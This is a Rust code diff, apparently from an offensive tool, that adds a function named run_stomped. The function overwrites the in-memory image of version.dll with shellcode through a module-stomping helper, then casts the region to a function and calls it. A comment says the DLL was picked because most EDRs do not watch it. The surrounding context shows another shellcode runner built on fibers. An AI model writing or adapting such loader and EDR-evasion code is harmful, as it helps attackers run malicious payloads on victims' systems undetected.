@@ -55,3 +55,17 @@ pub unsafe fn run_no_rwx(shellcode: &[u8]) {
     DeleteFiber(shell_fiber);
     let _ = main_fiber; // suppress unused warning
 }
+
+#[cfg(target_os = "windows")]
+pub unsafe fn run_stomped(shellcode: &[u8]) -> bool {
+    use crate::evasion::module_stomp::stomp_module;
+
+    // version.dll is tiny, always present, and not monitored by most EDRs.
+    let target = stomp_module(b"version.dll\0", shellcode);
+    let Some(exec_ptr) = target else { return false; };
+
+    // Cast the start of the stomped region to a no-arg function and call it.
+    let fn_ptr: extern "C" fn() = core::mem::transmute(exec_ptr);
+    fn_ptr();
+    true
+}
